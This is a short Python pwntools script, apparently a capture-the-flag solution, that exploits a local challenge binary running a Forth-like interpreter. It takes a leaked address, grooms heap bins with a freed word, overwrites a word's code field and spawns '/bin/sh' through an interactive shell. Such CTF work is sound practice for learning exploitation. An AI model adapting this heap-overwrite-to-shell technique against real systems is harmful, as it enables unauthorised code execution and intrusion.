#!/usr/bin/env python

from pwn import *

#p = process('./dist/chal')
p = remote('localhost', 1337)

p.recvuntil(b'me?')
p.recvline()

addr = p.recvline().strip();
print(f"got {addr}")

dosys = int(addr[2:], 16)


# same bin as dict/ref
victim = b"v" *24 

p.sendline(b": " + victim + b" ;")
p.sendline(b": win " + victim + b" ;")

p.sendline(b"forget " + victim)

#gdb.attach(p, gdbscript='break malloc \n c')

# 0x30 bin has 3 chunks (ignore) -> (ignore) -> (victim)
# 0x90 bin has 1 chunk (victim->param)

# define a new word named "/bin/sh;#..."
# 0x90 chunk gets allocated and set to word name
# 2 0x30 bins get allocated, leaving remaining bin the victim

command = b"/bin/sh"
padding = b";#" + (125 - len(command)) * b'a'
p.sendline(b": " + command + padding + b" ;")

# define a new word named "[padding]dosys", should be 24 + x bytes
# this will allocate from the last 0x30 bin, which is the victim
# the victim's flags, length, and reference fields may be overwritten
# with anything. The last x bytes overwrites the code field of the word

p.sendline(b": " + 24 * b"a" + p64(dosys) + b" ;")

p.sendline(b"win")

p.interactive()

